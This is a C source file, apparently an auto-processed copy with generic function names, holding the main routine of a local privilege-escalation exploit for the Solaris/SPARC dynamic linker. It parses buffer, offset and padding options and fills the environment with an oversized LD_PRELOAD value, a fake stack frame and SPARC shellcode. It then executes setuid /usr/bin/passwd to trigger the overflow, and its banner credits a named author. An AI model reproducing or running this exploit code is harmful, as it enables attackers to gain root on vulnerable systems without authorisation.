#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int DEF_FPAD_LEN ; 
 int DEF_OFFSET ; 
 long FRAME_ADDR ; 
 int REC_BUF_SIZE ; 
 char* SPARC_sc ; 
 int FUNC0 (int /*<<< orphan*/ ) ; 
 long FUNC1 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC2 (char*,char**,char**) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ) ; 
 char* FUNC4 (char) ; 
 char* FUNC5 (long) ; 
 char* FUNC6 (int,long) ; 
 char FUNC7 (int,char**,char*) ; 
 scalar_t__ FUNC8 (int) ; 
 int /*<<< orphan*/  FUNC9 (char*,float,int) ; 
 int /*<<< orphan*/  optarg ; 
 scalar_t__ optind ; 
 int /*<<< orphan*/  FUNC10 (char*) ; 
 int /*<<< orphan*/  FUNC11 (char*,...) ; 

int FUNC12(int argc, char **argv)
{

  char *prog[3];
  char *envs[7];  
  char opt;
  int buf_size = -1;
  int fpad_len = -1;
  long offset = -1;

  char *ld_pre_env = 0x0;
  char *fake_frame = 0x0;
 

  /* padding of sorts */
  char *envs_str1 = 0x0; 
  char *envs_str2 = 0x0; 
  char *fpad_buf = 0x0;

  // ------------------------------------------------ //
  

  while((opt = FUNC7(argc, argv, "s:o:p:")) != -1)
  {
    switch(opt) {
    case 's':
      if(!optarg) {
	FUNC11("-s needs size argument\n");
	FUNC3(0);
      }
      else
	buf_size = FUNC0(optarg);
      break;

    case 'o':
      if(!optarg) {
	FUNC11("-o needs offset argument\n");
	FUNC3(0);
      }
      else
	offset = FUNC1(optarg);
      break;

    case 'p':
      if(!optarg) {
	FUNC11("-p needs pad length argument\n");
	FUNC3(0);
      }
      else {
	fpad_len = FUNC0(optarg);
	if(fpad_len < 0)
	  fpad_len = 0;
      }
      break;

    default:
      FUNC11("Usage: %s [-s size] [-o offset] [-p fpad_len]\n", argv[0]);
      FUNC3(0);

    }
    
    argc -= optind;
    argv += optind;	
  }
  
  FUNC11("\n#######################################\n");
  FUNC11("# ld.so.1 LD_PRELOAD (SPARC) exploit  #\n");
  FUNC11("# coded by: osker178 (bjr213@psu.edu) #\n");
    FUNC11("#######################################\n\n");

  if(buf_size == -1)
  {
    FUNC11("Using default/recommended buffer size of %d\n", REC_BUF_SIZE);
    buf_size = REC_BUF_SIZE;
  }
  else if(buf_size % 4)
  {
    buf_size = buf_size + (4 - (buf_size%4));
    FUNC11("WARNING: Rounding BUF_SIZE up to 0x%x (%d)\n", buf_size, buf_size);
  }


  if(offset == -1)
  {
    FUNC11("Using default OFFSET of 0x%x (%d)\n", DEF_OFFSET, DEF_OFFSET);
    offset = DEF_OFFSET;
  }  
  else if((FRAME_ADDR + offset) % 8)
  {
    offset = offset + (8 - (offset%8));
    FUNC11("WARNING: Rounding offset up to 0x%x (%d)\n", offset, offset);
    FUNC11("(otherwise FRAME_ADDR would not be alligned correctly)\n");
  }


  if(fpad_len == -1)
  {
    FUNC11("Using default FPAD_LEN of 0x%x (%d)\n", DEF_FPAD_LEN, DEF_FPAD_LEN);
    fpad_len = DEF_FPAD_LEN;
  }

  // -------------------------------------------------- //


  ld_pre_env = FUNC6(buf_size, offset);
  if(!ld_pre_env)
    FUNC3(0);
  
  fake_frame = FUNC5(offset);
  if(!fake_frame)
    FUNC3(0);
  
  envs_str1 = FUNC4('1');
  if(!envs_str1)
    FUNC3(0);

  envs_str2 = FUNC4('2');
  if(!envs_str2)
    FUNC3(0);

    

  // -------------------------------------------------- //


  fpad_buf = (char *)FUNC8(fpad_len+1);
  if(!fpad_buf)
  {
    FUNC10("malloc");
    FUNC3(0);
  }
  FUNC9(fpad_buf, 'F', fpad_len);
  fpad_buf[fpad_len] = '\0';
  

  envs[0] = fpad_buf;
  envs[1] = fake_frame;
  envs[2] = envs_str1;
  envs[3] = SPARC_sc;
  envs[4] = envs_str2;
  envs[5] = ld_pre_env;
  envs[6] = NULL;

  prog[0] = "/usr/bin/passwd";
  prog[1] = "passwd";
  prog[2] = NULL;

  FUNC2(prog[0], prog, envs);

  FUNC10("execve");

  return 0;
}